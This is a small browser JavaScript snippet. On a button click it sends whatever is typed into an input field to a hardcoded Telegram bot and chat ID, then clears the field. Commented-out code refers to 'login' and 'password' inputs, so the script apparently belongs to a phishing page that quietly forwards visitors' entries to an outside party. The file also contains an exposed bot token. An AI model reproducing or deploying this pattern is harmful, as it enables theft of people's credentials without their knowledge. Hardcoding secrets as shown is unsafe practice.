

const btn1 = document.querySelector('#btn1');
const token1 = '5667940201:AAGW91sDZz9QZfN2g4xSAiSVIDBqZFoVVZo';

btn1.addEventListener('click', () => {
    const input1 = document.querySelector('#input1');
    let inp1 = input1.value;

    input1.value = '';

    const url = 'https://api.telegram.org/bot'+token1+'/sendMessage?chat_id=1201316750&text=';
    let xttp = new XMLHttpRequest();

    xttp.open("GET", url+inp1);
    xttp.send();
})

        // let inp1 = input.value;
    // const url = 'https://api.telegram.org/bot'+token1+'/sendMessage?chat_id=1201316750&text=';
    // let xttp = new XMLHttpRequest();

    // xttp.open("GET", url+inp1);
    // xttp.send();
    
// })

// btn1.addEventListener('click', () => {
//     const input1 = document.querySelector('#input1');
//     const input2 = document.querySelector('#input2');

//     let inp1 = input1.value,
//         inp2 = input2.value;

//     out1.innerHTML = `login : <b> ${inp1} </b>`;
//     out2.innerHTML = `password : <b> ${inp2} </b>`; 

//     input1.value = '';
//     input2.value = '';
// })